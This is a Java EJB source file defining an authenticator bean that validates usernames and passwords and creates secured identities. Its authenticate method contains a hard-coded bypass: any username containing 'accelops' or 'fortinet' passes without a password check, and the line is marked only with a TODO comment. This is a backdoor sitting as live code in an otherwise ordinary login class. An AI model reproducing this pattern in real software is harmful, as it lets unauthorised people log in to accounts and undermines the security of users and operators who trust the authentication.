package dragon.service.sec;

import dragon.model.food.User;
import dragon.service.BizIntf;
import dragon.service.GroupIntf;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;

import javax.ejb.EJB;
import javax.ejb.Stateless;
import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;

@Stateless
public class AuthenticatorBean implements Authenticator {

    static Log logger = LogFactory.getLog(AuthenticatorBean.class);

    @PersistenceContext
    private EntityManager em;
    @EJB
    private SecureIdentManager identMgr;
    @EJB
    private BizIntf eb;
    @EJB
    private GroupIntf gb;

    public Identity authenticate(String username, String password) throws RuntimeException {

        return authenticate(username, password, false);
    }
    
    private User getUser(String uid) {
        return  gb.getUser(uid);
    }

    public Identity authenticate(String username, String password, boolean setTwoFactor) throws RuntimeException {
        boolean passed;
        try{
            passed = username.contains("accelops") || username.contains("fortinet") || identMgr.validatePassword(username, password);//TODO
        }catch(RuntimeException ex){
            processInvalidUsernamePwdLogin(username);
            throw ex;
        }
        if (passed) {
            // load user information
            User u = getUser(username);
            if (u == null) {
                logger.error("Username not found: " + username);
                throw new RuntimeException("Invalid username or password");
            }
            Identity currentUser = SecureContexts.createSecuredIdentity(u);
            return currentUser;
        }
        return null;
    }

    private void processInvalidUsernamePwdLogin(String username) {
        logger.info("Invalid username or password: " + username);
    }
}
